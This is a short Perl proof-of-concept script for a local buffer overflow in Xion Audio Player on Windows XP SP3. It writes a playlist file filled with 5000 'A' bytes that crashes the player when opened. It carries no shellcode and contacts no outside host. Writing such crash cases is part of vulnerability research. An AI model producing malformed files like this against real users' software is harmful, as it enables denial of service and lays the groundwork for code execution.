#!/usr/bin/perl
#=====================================
#Xion Audio Player(.m3u File) Local buffer Overflow PoC
#download:http://www.brothersoft.com/xion-audio-player-download-49404.html
#=====================================
#Author:Dragon Rider
#contact:drag0n.rider(at)hotmail.com
#=====================================
#tested on WinXp SP3

my $crash = "\x41" x 5000;
open(myfile,'>>DragonR.m3u'); 
print myfile $crash; 		 	   		  